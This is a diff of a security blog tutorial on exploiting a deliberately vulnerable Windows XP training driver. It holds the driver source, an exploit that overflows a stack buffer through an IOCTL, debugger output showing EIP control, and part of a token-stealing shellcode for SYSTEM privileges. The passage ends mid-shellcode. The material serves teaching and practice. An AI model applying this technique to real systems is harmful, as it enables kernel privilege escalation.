@@ -7,13 +7,13 @@
   	<meta name="description" content="Passionate security researcher.">
   	<meta name="author" content="Dimitri Fourny">
 	
-	<link href="/css/bootstrap.min.css" rel="stylesheet">
-    <link href="/css/style.css" rel="stylesheet">
-  	<link href="/css/syntax.css" rel="stylesheet">
+	<link href="/assets/css/bootstrap.min.css" rel="stylesheet">
+    <link href="/assets/css/style.css" rel="stylesheet">
+  	<link href="/assets/css/syntax.css" rel="stylesheet">
 
     <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
     <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  	<link rel="shortcut icon" href="/img/favicon.png">
+  	<link rel="shortcut icon" href="/assets/img/favicon.png">
 </head>
 
 <body>
@@ -31,10 +31,9 @@
 		    <div class="navbar-collapse collapse" id="navbar-main">
 		      <ul class="nav navbar-nav navbar-right">
                 <li class="active"><a href="/">Home</a></li>
-                <li><a href="https://github.com/DimitriFourny">GitHub</a></li>
 		        <li><a href="https://twitter.com/DimitriFourny">Twitter</a></li>
+                <li><a href="https://github.com/DimitriFourny">GitHub</a></li>
 		        <li><a href="http://fr.linkedin.com/pub/dimitri-fourny/58/283/13a/">Linkedin</a></li>
-		        <li><a href="/feed.xml">RSS</a></li>
 		      </ul>
 		    </div>
 		</div>
@@ -44,14 +43,16 @@
 		
 		<div class="row">
 			<div class="col-sm-12">
-				<h1 id="kernel-buffer-overflow-on-windows">Kernel buffer overflow on Windows</h1>
-
+                <h1 id="kernel-buffer-overflow-on-windows">Kernel buffer overflow on Windows</h1>
 <h2 id="introduction">Introduction</h2>
 
-<p>The buffer overflow are cool in user-land and they can be more funny in kernel-land. 
-This time, we will use a buffer overflow to make an escalade privilege to get the SYSTEM rights, so we will could make anything we want on the system. To train us, we do not need to code a driver yourself: <a href="https://twitter.com/0vercl0k">0vercl0k</a> have done it for us ! So we got the files of <a href="https://github.com/0vercl0k/Windows-Kernel-Flaws">level 1</a> and we start our XP VM.</p>
+<p>The buffer overflow are cool in user-land but they can be more funny in 
+kernel-land. This time, we will use a buffer overflow to make an escalade 
+privilege to get the SYSTEM rights, so we will could make anything we want on 
+the system. To train us, we don’t need to code a driver by ourself: 0vercl0k 
+have done it for us! So we got the level 1 files and we start our XP VM.</p>
 
-<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;Ntifs.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Ntifs.h&gt;
 </span>
 <span class="cp">#define ERROR(_f_, _status_) DbgPrint("\r\n[!] Error at %s() : 0x%x\r\n", _f_, _status_)
 #define IOCTL_HI CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -61,13 +62,13 @@ This time, we will use a buffer overflow to make an escalade privilege to get th
 <span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">PBYTE</span><span class="p">;</span>
 <span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">BYTE</span><span class="p">;</span>
 
-<span class="c1">//
-</span><span class="n">DRIVER_UNLOAD</span> <span class="n">Unload</span><span class="p">;</span>
+<span class="c1">//</span>
+<span class="n">DRIVER_UNLOAD</span> <span class="n">Unload</span><span class="p">;</span>
 <span class="n">DRIVER_INITIALIZE</span> <span class="n">DriverEntry</span><span class="p">;</span>
 <span class="n">DRIVER_DISPATCH</span> <span class="n">handleIOCTLs</span><span class="p">;</span>
 <span class="n">DRIVER_DISPATCH</span> <span class="n">handleIRP</span><span class="p">;</span>
-<span class="c1">//
-</span>
+<span class="c1">//</span>
+
 <span class="n">NTSTATUS</span> <span class="nf">DriverEntry</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">pDriverObj</span> <span class="p">,</span> <span class="n">PUNICODE_STRING</span> <span class="n">pRegistryPath</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
@@ -138,31 +139,35 @@ This time, we will use a buffer overflow to make an escalade privilege to get th
 <span class="p">{</span>
     <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Unloading.. ]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
     <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span></code></pre></figure>
+<span class="p">}</span>
+</code></pre></div></div>
 
-<p>It is easy to see the problem: the copy size in <em>strcpy</em> is not checked!</p>
+<p>It’s easy to see the problem: the copy size in <code class="highlighter-rouge">strcpy</code> is not checked!</p>
 
 <h2 id="tools">Tools</h2>
 
-<p>To test the driver, we will need the <a href="http://msdn.microsoft.com/en-us/windows/hardware/hh852365.aspx">Windows Driver Kit and WinDbg</a> and a assembly code compiler, <a href="http://flatassembler.net/download.php">FASM</a>.<br />
-To compile with the WDK, we need to make a file with the name “makefile”:</p>
+<p>To test the driver, we will need the Windows Driver Kit, WinDbg and an assembly 
+code compiler, FASM. To compile with the WDK, we need to make a file with the 
+name <code class="highlighter-rouge">makefile</code>:</p>
 
-<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">!INCLUDE $(NTMAKEENV)\makefile.def</code></pre></figure>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!INCLUDE $(NTMAKEENV)\makefile.def
+</code></pre></div></div>
 
-<p>Fo a driver, the file “sources”:</p>
+<p>Fo a driver, the file <code class="highlighter-rouge">sources</code> has this content:</p>
 
-<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">TARGETNAME = level1
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TARGETNAME = level1
 TARGETPATH = obj
 TARGETTYPE = DRIVER
 
 INCLUDES = %BUILD%\inc
 LIBS = %BUILD%\lib
 
-SOURCES = level1.c</code></pre></figure>
+SOURCES = level1.c
+</code></pre></div></div>
 
-<p>And the “sources” file for a simple .exe:</p>
+<p>And the <code class="highlighter-rouge">sources</code> file for a simple .exe:</p>
 
-<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">TARGETNAME=exploit
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TARGETNAME=exploit
 TARGETTYPE=PROGRAM
 
 INCLUDES=
@@ -172,19 +177,20 @@ SOURCES=exploit.c
 UMTYPE=console
 UMBASE=0x04000000
 
-USE_MSVCRT=1</code></pre></figure>
+USE_MSVCRT=1
+</code></pre></div></div>
 
 <h2 id="debug-a-vm">Debug a VM</h2>
 
-<p>In Windows VM, <strong>msconfig.exe -&gt; BOOT.ini -&gt; Advanced -&gt; /DEBUG /DEBUGPORT=COM1:</strong>  and reboot.<br />
-In VirtualBox, <strong>Machine -&gt; Settings -&gt; Serial Ports</strong> and configure it.<br />
-In WinDbg, <strong>File -&gt; Kernel Debug… -&gt; COM</strong> and click on <strong>OK</strong>.</p>
+<p>In Windows VM, <code class="highlighter-rouge">msconfig.exe -&gt; BOOT.ini -&gt; Advanced -&gt; /DEBUG /DEBUGPORT=COM1:</code>
+and reboot. In VirtualBox, <code class="highlighter-rouge">Machine -&gt; Settings -&gt; Serial Ports</code> and configure it.
+In WinDbg, <code class="highlighter-rouge">File -&gt; Kernel Debug... -&gt; COM</code> and click on OK.</p>
 
 <h2 id="exploitation">Exploitation</h2>
 
-<p>Now, we can load our driver with <a href="http://www.osronline.com/article.cfm?name=osrloaderv30.zip&amp;id=157">Driver Loader</a>, and we test our entry:</p>
+<p>Now, we can load our driver with Driver Loader and test our entry:</p>
 
-<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;windows.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
 #include &lt;winioctl.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
@@ -198,10 +204,10 @@ In WinDbg, <strong>File -&gt; Kernel Debug… -&gt; COM</strong> and click on <s
     <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
     <span class="n">UCHAR</span> <span class="n">magik</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
 
-    <span class="n">memset</span><span class="p">(</span><span class="n">magik</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mi">276</span><span class="p">);</span> <span class="c1">// Padding
-</span>    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">276</span><span class="p">;</span>
-    <span class="n">memcpy</span><span class="p">(</span><span class="n">magik</span><span class="o">+</span><span class="mi">276</span><span class="p">,</span> <span class="s">"</span><span class="se">\x42\x42\x42\x42\x00</span><span class="s">"</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span> <span class="c1">// Shellcode address?
-</span>    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">magik</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mi">276</span><span class="p">);</span> <span class="c1">// Padding</span>
+    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">276</span><span class="p">;</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">magik</span><span class="o">+</span><span class="mi">276</span><span class="p">,</span> <span class="s">"</span><span class="se">\x42\x42\x42\x42\x00</span><span class="s">"</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span> <span class="c1">// Shellcode address?</span>
+    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>
 
     <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span> <span class="o">|</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
     <span class="k">if</span><span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
@@ -213,11 +219,10 @@ In WinDbg, <strong>File -&gt; Kernel Debug… -&gt; COM</strong> and click on <s
     <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
 
     <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
-<span class="p">}</span></code></pre></figure>
+<span class="p">}</span>
+</code></pre></div></div>
 
-<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">Launching OACR monitor
-
-C:\WinDDK\7600.16385.1&gt;cd C:\driver\level0
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\WinDDK\7600.16385.1&gt;cd C:\driver\level0
 
 C:\driver\level0&gt;build
 BUILD: Compile and Link for x86
@@ -236,9 +241,10 @@ BUILD: Finish time: Thu Feb 27 09:13:58 2014
 BUILD: Done
 
     3 files compiled - 1 Warning - 30 LPS
-    1 executable built</code></pre></figure>
+    1 executable built
+</code></pre></div></div>
 
-<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">kd&gt; g
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; g
 [ Loading.. ]
 [ Creating the device...]
 [ Linking...]
@@ -273,11 +279,12 @@ baf7d62c 8be5            mov     esp,ebp
 baf7d62e 5d              pop     ebp
 baf7d62f c20800          ret     8
 
-kd&gt; bp baf7d62f</code></pre></figure>
+kd&gt; bp baf7d62f
+</code></pre></div></div>
 
-<p>All is ready ! We <code>!go</code> and WinDbg look like that:</p>
+<p>All is ready ! We <code class="highlighter-rouge">!go</code> and WinDbg look like that:</p>
 
-<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">kd&gt; g
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; g
 [ Let's copying this buffer...]Breakpoint 0 hit
 1+0x62f:
 baf7d62f c20800          ret     8
@@ -287,17 +294,19 @@ b9019c38  42424242 8657fc00 863b0700 806d1070
 b9019c48  80574d5e 863b0770 8672a420 863b0700
 
 kd&gt; t
-42424242 ??              ???</code></pre></figure>
+42424242 ??              ???
+</code></pre></div></div>
 
-<p>We control EIP ! Therefore, we will put a shellcode in userland to make an escalade privilege of our process.<br />
-After that, we will point EIP to our shellcode and hop, our process have the SYSTEM rights!</p>
+<p>We control EIP! Therefore, we will put a shellcode in userland to make an 
+escalade privilege of our process. After that, we will point EIP to our 
+shellcode and hop, our process have the SYSTEM rights!</p>
 
 <h2 id="shellcode">Shellcode</h2>
 
-<p>How we can do to code this shellcode? We just need to swap the SYSTEM token with our process token and is done!
-Good, we look for structures in our Windows friend:</p>
+<p>Now we need to code a shellcode to swap the SYSTEM token with our process token.
+To do that, we look for useful structures in Windows kernel:</p>
 
-<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">kd&gt; r fs
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; r fs
 fs=00000030
 
 kd&gt; dg fs
@@ -341,94 +350,6 @@ nt!_KPRCB
    +0x000 MinorVersion     : 1
    +0x002 MajorVersion     : 1
    +0x004 CurrentThread    : 0x80552740 _KTHREAD
-   +0x008 NextThread       : (null) 
-   +0x00c IdleThread       : 0x80552740 _KTHREAD
-   +0x010 Number           : 0 ''
-   +0x011 Reserved         : 0 ''
-   +0x012 BuildType        : 2
-   +0x014 SetMember        : 1
-   +0x018 CpuType          : 6 ''
-   +0x019 CpuID            : 1 ''
-   +0x01a CpuStep          : 0x3a09
-   +0x01c ProcessorState   : _KPROCESSOR_STATE
-   +0x33c KernelReserved   : [16] 0
-   +0x37c HalReserved      : [16] 0
-   +0x3bc PrcbPad0         : [92]  ""
-   +0x418 LockQueue        : [16] _KSPIN_LOCK_QUEUE
-   +0x498 PrcbPad1         : [8]  ""
-   +0x4a0 NpxThread        : 0x863a22d0 _KTHREAD
-   +0x4a4 InterruptCount   : 0x352b
-   +0x4a8 KernelTime       : 0x1c0d
-   +0x4ac UserTime         : 0xc8
-   +0x4b0 DpcTime          : 0x22
-   +0x4b4 DebugDpcTime     : 0
-   +0x4b8 InterruptTime    : 0x8a
-   +0x4bc AdjustDpcThreshold : 0x14
-   +0x4c0 PageColor        : 0
-   +0x4c4 SkipTick         : 0
-   +0x4c8 MultiThreadSetBusy : 0 ''
-   +0x4c9 Spare2           : [3]  ""
-   +0x4cc ParentNode       : 0x80552e00 _KNODE
-   +0x4d0 MultiThreadProcessorSet : 1
-   +0x4d4 MultiThreadSetMaster : (null) 
-   +0x4d8 ThreadStartCount : [2] 0
-   +0x4e0 CcFastReadNoWait : 0
-   +0x4e4 CcFastReadWait   : 0
-   +0x4e8 CcFastReadNotPossible : 0
-   +0x4ec CcCopyReadNoWait : 0
-   +0x4f0 CcCopyReadWait   : 0
-   +0x4f4 CcCopyReadNoWaitMiss : 0
-   +0x4f8 KeAlignmentFixupCount : 0
-   +0x4fc KeContextSwitches : 0xabc0
-   +0x500 KeDcacheFlushCount : 0
-   +0x504 KeExceptionDispatchCount : 0x190
-   +0x508 KeFirstLevelTbFills : 0
-   +0x50c KeFloatingEmulationCount : 0
-   +0x510 KeIcacheFlushCount : 0
-   +0x514 KeSecondLevelTbFills : 0
-   +0x518 KeSystemCalls    : 0x92373
-   +0x51c SpareCounter0    : [1] 0
-   +0x520 PPLookasideList  : [16] _PP_LOOKASIDE_LIST
-   +0x5a0 PPNPagedLookasideList : [32] _PP_LOOKASIDE_LIST
-   +0x6a0 PPPagedLookasideList : [32] _PP_LOOKASIDE_LIST
-   +0x7a0 PacketBarrier    : 0
-   +0x7a4 ReverseStall     : 0
-   +0x7a8 IpiFrame         : (null) 
-   +0x7ac PrcbPad2         : [52]  ""
-   +0x7e0 CurrentPacket    : [3] (null) 
-   +0x7ec TargetSet        : 0
-   +0x7f0 WorkerRoutine    : (null) 
-   +0x7f4 IpiFrozen        : 0
-   +0x7f8 PrcbPad3         : [40]  ""
-   +0x820 RequestSummary   : 0
-   +0x824 SignalDone       : (null) 
-   +0x828 PrcbPad4         : [56]  ""
-   +0x860 DpcListHead      : _LIST_ENTRY [ 0x80552da4 - 0x80552da4 ]
-   +0x868 DpcStack         : 0xbacd0000 Void
-   +0x86c DpcCount         : 0x1a37
-   +0x870 DpcQueueDepth    : 1
-   +0x874 DpcRoutineActive : 0
-   +0x878 DpcInterruptRequested : 0
-   +0x87c DpcLastCount     : 0x1a37
-   +0x880 DpcRequestRate   : 0
-   +0x884 MaximumDpcQueueDepth : 1
-   +0x888 MinimumDpcRate   : 3
-   +0x88c QuantumEnd       : 0
-   +0x890 PrcbPad5         : [16]  ""
-   +0x8a0 DpcLock          : 0
-   +0x8a4 PrcbPad6         : [28]  ""
-   +0x8c0 CallDpc          : _KDPC
-   +0x8e0 ChainedInterruptList : (null) 
-   +0x8e4 LookasideIrpFloat : 0n1438
-   +0x8e8 SpareFields0     : [6] 0
-   +0x900 VendorString     : [13]  "GenuineIntel"
-   +0x90d InitialApicId    : 0 ''
-   +0x90e LogicalProcessorsPerPhysicalProcessor : 0x1 ''
-   +0x910 MHz              : 0x8da
-   +0x914 FeatureBits      : 0xa0013fff
-   +0x918 UpdateSignature  : _LARGE_INTEGER 0x0
-   +0x920 NpxSaveArea      : _FX_SAVE_AREA
-   +0xb30 PowerState       : _PROCESSOR_POWER_STATE
 
 kd&gt; dt _KTHREAD poi(ffdff000+0x120+0x004) 
 nt!_KTHREAD
@@ -447,72 +368,11 @@ nt!_KTHREAD
    +0x032 Saturation       : 0 ''
    +0x033 Priority         : 16 ''
    +0x034 ApcState         : _KAPC_STATE
-   +0x04c ContextSwitches  : 0x1852
-   +0x050 IdleSwapBlock    : 0 ''
-   +0x051 Spare0           : [3]  ""
-   +0x054 WaitStatus       : 0n0
-   +0x058 WaitIrql         : 0x2 ''
-   +0x059 WaitMode         : 0 ''
-   +0x05a WaitNext         : 0 ''
-   +0x05b WaitReason       : 0 ''
-   +0x05c WaitBlockList    : (null) 
-   +0x060 WaitListEntry    : _LIST_ENTRY [ 0x0 - 0x0 ]
-   +0x060 SwapListEntry    : _SINGLE_LIST_ENTRY
-   +0x068 WaitTime         : 0
-   +0x06c BasePriority     : 0 ''
-   +0x06d DecrementCount   : 0 ''
-   +0x06e PriorityDecrement : 0 ''
-   +0x06f Quantum          : -43 ''
-   +0x070 WaitBlock        : [4] _KWAIT_BLOCK
-   +0x0d0 LegoData         : (null) 
-   +0x0d4 KernelApcDisable : 0
-   +0x0d8 UserAffinity     : 0xffffffff
-   +0x0dc SystemAffinityActive : 0 ''
-   +0x0dd PowerState       : 0 ''
-   +0x0de NpxIrql          : 0 ''
-   +0x0df InitialNode      : 0 ''
-   +0x0e0 ServiceTable     : 0x80552fa0 Void
-   +0x0e4 Queue            : (null) 
-   +0x0e8 ApcQueueLock     : 0
-   +0x0f0 Timer            : _KTIMER
-   +0x118 QueueListEntry   : _LIST_ENTRY [ 0x0 - 0x0 ]
-   +0x120 SoftAffinity     : 1
-   +0x124 Affinity         : 1
-   +0x128 Preempted        : 0 ''
-   +0x129 ProcessReadyQueue : 0 ''
-   +0x12a KernelStackResident : 0x1 ''
-   +0x12b NextProcessor    : 0 ''
-   +0x12c CallbackStack    : (null) 
-   +0x130 Win32Thread      : (null) 
-   +0x134 TrapFrame        : (null) 
-   +0x138 ApcStatePointer  : [2] 0x80552774 _KAPC_STATE
-   +0x140 PreviousMode     : 0 ''
-   +0x141 EnableStackSwap  : 0x1 ''
-   +0x142 LargeStack       : 0 ''
-   +0x143 ResourceIndex    : 0 ''
-   +0x144 KernelTime       : 0x1858
-   +0x148 UserTime         : 0
-   +0x14c SavedApcState    : _KAPC_STATE
-   +0x164 Alertable        : 0 ''
-   +0x165 ApcStateIndex    : 0 ''
-   +0x166 ApcQueueable     : 0x1 ''
-   +0x167 AutoAlignment    : 0 ''
-   +0x168 StackBase        : 0x80549f00 Void
-   +0x16c SuspendApc       : _KAPC
-   +0x19c SuspendSemaphore : _KSEMAPHORE
-   +0x1b0 ThreadListEntry  : _LIST_ENTRY [ 0x805529f0 - 0x805529f0 ]
-   +0x1b8 FreezeCount      : 0 ''
-   +0x1b9 SuspendCount     : 0 ''
-   +0x1ba IdealProcessor   : 0 ''
-   +0x1bb DisableBoost     : 0 ''
 
 kd&gt; dt _KAPC_STATE poi(ffdff000+0x120+0x004)+0x034 
 nt!_KAPC_STATE
    +0x000 ApcListHead      : [2] _LIST_ENTRY [ 0x80552774 - 0x80552774 ]
    +0x010 Process          : 0x805529a0 _KPROCESS
-   +0x014 KernelApcInProgress : 0 ''
-   +0x015 KernelApcPending : 0 ''
-   +0x016 UserApcPending   : 0 ''
 
 kd&gt; dt _EPROCESS poi(ffdff000+0x120+0x004)+0x034+0x10 
 nt!_EPROCESS
@@ -533,102 +393,15 @@ nt!_EPROCESS
    +0x0c0 ExceptionPort    : (null) 
    +0x0c4 ObjectTable      : (null) 
    +0x0c8 Token            : _EX_FAST_REF
-   +0x0cc WorkingSetLock   : _FAST_MUTEX
-   +0x0ec WorkingSetPage   : 0
-   +0x0f0 AddressCreationLock : _FAST_MUTEX
-   +0x110 HyperSpaceLock   : 0
-   +0x114 ForkInProgress   : (null) 
-   +0x118 HardwareTrigger  : 0
-   +0x11c VadRoot          : (null) 
-   +0x120 VadHint          : 0x00010000 Void
-   +0x124 CloneRoot        : 0x80549f00 Void
-   +0x128 NumberOfPrivatePages : 0x300012
-   +0x12c NumberOfLockedPages : 0
-   +0x130 Win32Process     : 0x80552740 Void
-   +0x134 Job              : (null) 
-   +0x138 SectionObject    : (null) 
-   +0x13c SectionBaseAddress : 0x80500832 Void
-   +0x140 QuotaBlock       : 0x8050083a _EPROCESS_QUOTA_BLOCK
-   +0x144 WorkingSetWatch  : 0x80500c70 _PAGEFAULT_HISTORY
-   +0x148 Win32WindowStation : (null) 
-   +0x14c InheritedFromUniqueProcessId : (null) 
-   +0x150 LdtInformation   : (null) 
-   +0x154 VadFreeHint      : (null) 
-   +0x158 VdmObjects       : 0x00050005 Void
-   +0x15c DeviceMap        : (null) 
-   +0x160 PhysicalVadList  : _LIST_ENTRY [ 0x805528e4 - 0x805528e4 ]
-   +0x168 PageDirectoryPte : _HARDWARE_PTE
-   +0x168 Filler           : 0x805529f0`00000002
-   +0x170 Session          : 0x805529f0 Void
-   +0x174 ImageFileName    : [16]  ""
-   +0x184 JobLinks         : _LIST_ENTRY [ 0x0 - 0x0 ]
-   +0x18c LockedPagesList  : (null) 
-   +0x190 ThreadListHead   : _LIST_ENTRY [ 0x0 - 0x0 ]
-   +0x198 SecurityPort     : (null) 
-   +0x19c PaeTop           : (null) 
-   +0x1a0 ActiveThreads    : 0
-   +0x1a4 GrantedAccess    : 0
-   +0x1a8 DefaultHardErrorProcessing : 0
-   +0x1ac LastThreadExitStatus : 0n0
-   +0x1b0 Peb              : (null) 
-   +0x1b4 PrefetchTrace    : _EX_FAST_REF
-   +0x1b8 ReadOperationCount : _LARGE_INTEGER 0x0
-   +0x1c0 WriteOperationCount : _LARGE_INTEGER 0x0
-   +0x1c8 OtherOperationCount : _LARGE_INTEGER 0x0
-   +0x1d0 ReadTransferCount : _LARGE_INTEGER 0x0
-   +0x1d8 WriteTransferCount : _LARGE_INTEGER 0x0
-   +0x1e0 OtherTransferCount : _LARGE_INTEGER 0x0
-   +0x1e8 CommitChargeLimit : 0
-   +0x1ec CommitChargePeak : 0
-   +0x1f0 AweInfo          : (null) 
-   +0x1f4 SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO
-   +0x1f8 Vm               : _MMSUPPORT
-   +0x238 LastFaultCount   : 0
-   +0x23c ModifiedPageCount : 0
-   +0x240 NumberOfVads     : 0
-   +0x244 JobStatus        : 0
-   +0x248 Flags            : 0
-   +0x248 CreateReported   : 0y0
-   +0x248 NoDebugInherit   : 0y0
-   +0x248 ProcessExiting   : 0y0
-   +0x248 ProcessDelete    : 0y0
-   +0x248 Wow64SplitPages  : 0y0
-   +0x248 VmDeleted        : 0y0
-   +0x248 OutswapEnabled   : 0y0
-   +0x248 Outswapped       : 0y0
-   +0x248 ForkFailed       : 0y0
-   +0x248 HasPhysicalVad   : 0y0
-   +0x248 AddressSpaceInitialized : 0y00
-   +0x248 SetTimerResolution : 0y0
-   +0x248 BreakOnTermination : 0y0
-   +0x248 SessionCreationUnderway : 0y0
-   +0x248 WriteWatch       : 0y0
-   +0x248 ProcessInSession : 0y0
-   +0x248 OverrideAddressSpace : 0y0
-   +0x248 HasAddressSpace  : 0y0
-   +0x248 LaunchPrefetched : 0y0
-   +0x248 InjectInpageErrors : 0y0
-   +0x248 VmTopDown        : 0y0
-   +0x248 Unused3          : 0y0
-   +0x248 Unused4          : 0y0
-   +0x248 VdmAllowed       : 0y0
-   +0x248 Unused           : 0y00000 (0)
-   +0x248 Unused1          : 0y0
-   +0x248 Unused2          : 0y0
-   +0x24c ExitStatus       : 0n8364
-   +0x250 NextPageColor    : 1
-   +0x252 SubSystemMinorVersion : 0 ''
-   +0x253 SubSystemMajorVersion : 0 ''
-   +0x252 SubSystemVersion : 0
-   +0x254 PriorityClass    : 0x58 'X'
-   +0x255 WorkingSetAcquiredUnsafe : 0x18 ''
-   +0x258 Cookie           : 0</code></pre></figure>
+</code></pre></div></div>
 
-<p>We could get <code>UniqueProcessId (+0x084)</code>, our <code>Token (+0x0c8)</code> and also the linked list <code>ActiveProcessLinks (+0x088)</code> to get the list of all process.<br />
-In XP, the identifier of SYSTEM process is <strong>4</strong> and we can get our PID with <code>GetCurrentProcessId()</code>.<br />
-With these information, we can code our shellcode. I have coded mine with the FASM syntax:</p>
+<p>We could use <code class="highlighter-rouge">UniqueProcessId (+0x084)</code>, our <code class="highlighter-rouge">Token (+0x0c8)</code> and also the 
+linked list <code class="highlighter-rouge">ActiveProcessLinks (+0x088)</code> to get the list of all process.
+In XP, the identifier of SYSTEM process is <em>4</em> and we can get our PID with 
+<code class="highlighter-rouge">GetCurrentProcessId()</code>. With these information, we can code our shellcode. 
+I have coded mine with the FASM syntax:</p>
 
-<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">format</span> <span class="n">PE</span> <span class="n">GUI</span> <span class="mi">4</span><span class="p">.</span><span class="mi">0</span>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">format</span> <span class="n">PE</span> <span class="n">GUI</span> <span class="mi">4</span><span class="p">.</span><span class="mi">0</span>
 
 <span class="n">start</span><span class="o">:</span>
 
@@ -642,23 +415,23 @@ With these information, we can code our shellcode. I have coded mine with the FA
 <span class="k">push</span> <span class="mh">0xFFFFFFFF</span>
 <span class="k">push</span> <span class="mh">0xFFFFFFFF</span>
 
-<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">fs</span><span class="o">:</span><span class="mh">0x124</span><span class="err">]</span>		<span class="c">; +0x120 PrcbData : _KPRCB | +0x004 CurrentThread : _KTHREAD			</span>
-<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">+</span> <span class="mh">0x44</span><span class="err">]</span>	<span class="c">; +0x034 ApcState : _KAPC_STATE | +0x010 Process : _KPROCESS</span>
-<span class="k">add</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x88</span> 			<span class="c">; +0x088 ActiveProcessLinks : _LIST_ENTRY</span>
-<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">edx</span> 			<span class="c">; Our linked list \o/ We save the first structure</span>
+<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">fs</span><span class="o">:</span><span class="mh">0x124</span><span class="err">]</span>     <span class="c">; +0x120 PrcbData : _KPRCB | +0x004 CurrentThread : _KTHREAD			</span>
+<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">+</span> <span class="mh">0x44</span><span class="err">]</span>   <span class="c">; +0x034 ApcState : _KAPC_STATE | +0x010 Process : _KPROCESS</span>
+<span class="k">add</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x88</span>           <span class="c">; +0x088 ActiveProcessLinks : _LIST_ENTRY</span>
+<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">edx</span>            <span class="c">; Our linked list \o/ We save the first structure</span>
 
 <span class="n">searchProcess</span><span class="o">:</span>
-<span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">-</span> <span class="mh">0x4</span><span class="err">]</span>	<span class="c">; +0x084 UniqueProcessId</span>
-<span class="k">cmp</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x4</span> 			<span class="c">; SYSTEM PID</span>
+<span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">-</span> <span class="mh">0x4</span><span class="err">]</span>    <span class="c">; +0x084 UniqueProcessId</span>
+<span class="k">cmp</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x4</span>            <span class="c">; SYSTEM PID</span>
 <span class="k">je</span> <span class="n">sysProcFound</span>
